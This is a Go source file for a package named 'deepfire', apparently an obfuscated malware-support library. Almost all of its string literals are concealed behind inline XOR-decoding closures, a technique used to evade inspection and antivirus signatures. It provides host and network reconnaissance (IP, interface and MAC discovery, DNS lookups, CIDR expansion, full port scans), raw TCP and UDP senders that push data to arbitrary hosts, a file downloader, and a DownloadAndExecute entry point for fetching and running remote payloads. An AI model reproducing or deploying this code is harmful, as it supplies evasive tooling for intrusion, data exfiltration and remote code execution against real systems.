package deepfire

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/jackpal/gateway"
)

// GetGlobalIp is used to return the global Ip address of the machine.
func GetGlobalIp() string {
	ip := (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	resolvers := []string{
		(func() string {
mask := []byte("\x0c\x11\xed\x78\xf4\x61\xc2\x47\x09\x4b\x98\xdd\x2a\xf5\x9f\x24\x99\x71\x4a\x3e\x0e\xb0\xef\xb0\xaa\x6c\x61\xb2\xf6\x46\x0f\xb5\x94")
maskedStr := []byte("\x64\x65\x99\x08\x87\x5b\xed\x68\x68\x3b\xf1\xf3\x43\x85\xf6\x42\xe0\x5f\x25\x4c\x69\x8f\x89\xdf\xd8\x01\x00\xc6\xcb\x32\x6a\xcd\xe0")
res := make([]byte, 33)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x3e\x64\x4a\x5b\x55\xf4\x16\xf0\x65\xb4\x74\xd9\x3f\x07\x29\x7e\x12\xbf\xf6\xc1")
maskedStr := []byte("\x56\x10\x3e\x2b\x6f\xdb\x39\x91\x15\xdd\x5a\xb0\x4f\x6e\x4f\x07\x3c\xd0\x84\xa6")
res := make([]byte, 20)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x39\x0b\x1e\x33\xc0\x65\xec\x68\xa2\x1e\xbe\xd1\x5a\x66\xc2\xcd\xa6\xf2\x46\x39\x03\x84\xe1\xf9\x72\x46\xf5\x3e\xa3\x3b\x49\x47")
maskedStr := []byte("\x51\x7f\x6a\x43\xfa\x4a\xc3\x09\xd2\x77\x90\xb8\x2a\x0f\xa4\xb4\x88\x9d\x34\x5e\x3c\xe2\x8e\x8b\x1f\x27\x81\x03\xd7\x5e\x31\x33")
res := make([]byte, 32)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x0d\xb2\xba\x43\x5a\x6b\x52\xf2\x01\x99\x3f\xbb\x0f\xa3\x55\x95\xb3\x5e\x95\xeb\x50")
maskedStr := []byte("\x65\xc6\xce\x33\x29\x51\x7d\xdd\x60\xe9\x56\x95\x66\xd3\x3c\xf3\xca\x70\xfa\x99\x37")
res := make([]byte, 21)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
	}

	for {
		url := RandomSelectStr(resolvers)
		resp, err := http.Get(url)
		if err != nil {
			log.Printf((func() string {
mask := []byte("\x27\x5f\x83")
maskedStr := []byte("\x02\x29\x89")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err)
		}
		defer resp.Body.Close()

		i, _ := ioutil.ReadAll(resp.Body)
		ip = string(i)

		if resp.StatusCode == 200 {
			break
		}
	}

	return ip
}

// GetLocalIp is used to get the local Ip address of the machine.
func GetLocalIp() string {
	conn, _ := net.Dial((func() string {
mask := []byte("\x9e\x13\xcd")
maskedStr := []byte("\xeb\x77\xbd")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xb8\x71\xb8\x82\x49\x17\xfa\x39\x91\xa7")
maskedStr := []byte("\x80\x5f\x80\xac\x71\x39\xc2\x03\xa9\x97")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	defer conn.Close()
	ip := conn.LocalAddr().(*net.UDPAddr).IP

	return fmt.Sprintf((func() string {
mask := []byte("\xb2\xd2\xd8\x60\x36\x2e\x5d\x8e\x1e\xca\x9e")
maskedStr := []byte("\x97\xb6\xf6\x45\x52\x00\x78\xea\x30\xef\xfa")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), ip[0], ip[1], ip[2], ip[3])
}

// GetGatewayIP returns the Ip address of the gateway in the network where the machine resides.
func GetGatewayIP() string {
	ip, err := gateway.DiscoverGateway()
	ExitOnError(err)

	return ip.String()
}

// Iface returns the currently used wireless interface and its MAC address.
func Iface() (string, string) {
	current_iface := (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	interfaces, err := net.Interfaces()
	ExitOnError(err)

	for _, interf := range interfaces {
		if addrs, err := interf.Addrs(); err == nil {
			for _, addr := range addrs {
				if strings.Contains(addr.String(), GetLocalIp()) {
					current_iface = interf.Name
				}
			}
		}
	}

	netInterface, err := net.InterfaceByName(current_iface)
	ExitOnError(err)

	name := netInterface.Name
	macAddress := netInterface.HardwareAddr
	hwAddr, err := net.ParseMAC(macAddress.String())
	ExitOnError(err)

	return name, hwAddr.String()
}

// Ifaces returns the names of all local interfaces.
func Ifaces() []string {
	ifs := []string{}
	interfaces, _ := net.Interfaces()

	for _, interf := range interfaces {
		ifs = append(ifs, interf.Name)
	}

	return ifs
}

// SendDataTCP sends data to a given host:port using the TCP protocol.
func SendDataTCP(host string, port int, data string) error {
	addr := host + (func() string {
mask := []byte("\xb2")
maskedStr := []byte("\x88")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) + strconv.Itoa(port)
	conn, err := net.Dial((func() string {
mask := []byte("\x62\x1f\xc3")
maskedStr := []byte("\x16\x7c\xb3")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), addr)
	if err != nil {
		return err
	}
	_, err = io.WriteString(conn, data+(func() string {
mask := []byte("\x5c")
maskedStr := []byte("\x56")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		return err
	}
	defer conn.Close()

	return nil
}

// SendDataUDP sends data to a given host:port using the UDP protocol.
func SendDataUDP(host string, port int, data string) error {
	addr := host + (func() string {
mask := []byte("\xd0")
maskedStr := []byte("\xea")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) + strconv.Itoa(port)
	conn, err := net.Dial((func() string {
mask := []byte("\x64\xc8\x63")
maskedStr := []byte("\x11\xac\x13")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), addr)
	if err != nil {
		return err
	}

	_, err = io.WriteString(conn, data+(func() string {
mask := []byte("\xd9")
maskedStr := []byte("\xd3")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		return err
	}
	defer conn.Close()

	return nil
}

// Download downloads a file from a url.
func Download(url string) error {
	splitted := strings.Split(url, (func() string {
mask := []byte("\x53")
maskedStr := []byte("\x7c")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	filename := splitted[len(splitted)-1]

	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	_, err = io.Copy(f, response.Body)
	if err != nil {
		return err
	}
	return nil
}

func DownloadAndExecute(url string, cmd string) (string, error) {
	return downloadAndExecute(url, cmd)
}

// Networks returns a list of nearby wireless networks.
func Networks() ([]string, error) {
	return networks()
}

// ExpandCidr returns a list of Ip addresses within a given CIDR.
func ExpandCidr(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); IpIncrement(ip) {
		ips = append(ips, ip.String())
	}

	lenIPs := len(ips)
	switch {
	case lenIPs < 2:
		return ips, nil
	default:
		return ips[1 : len(ips)-1], nil
	}
}

// DnsLookup returns the list of Ip adddress associated with the given hostname.
func DnsLookup(hostname string) ([]string, error) {
	i := []string{}
	ips, err := net.LookupIP(hostname)
	if err != nil {
		return nil, err
	}

	for _, ip := range ips {
		i = append(i, ip.String())
	}

	return i, nil
}

// RdnsLookup returns the list of hostnames associated with the given Ip address.
func RdnsLookup(ip string) ([]string, error) {
	ips, err := net.LookupAddr(ip)
	if err != nil {
		return nil, err
	}
	return ips, nil
}

// Portscan checks for open ports in a given target.
func Portscan(target string, timeout, threads int) (pr []int) {
	ps := portscanner.NewPortScanner(target, time.Duration(timeout)*time.Second, threads)
	opened_ports := ps.GetOpenedPort(0, 65535)

	for p := range opened_ports {
		port := opened_ports[p]
		pr = append(pr, port)
	}

	return
}

// PortscanSingle checks if a specific port is open in a given target.
func PortscanSingle(target string, port int) bool {
	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
	opened_ports := ps.GetOpenedPort(port-1, port+1)

	return len(opened_ports) != 0
}
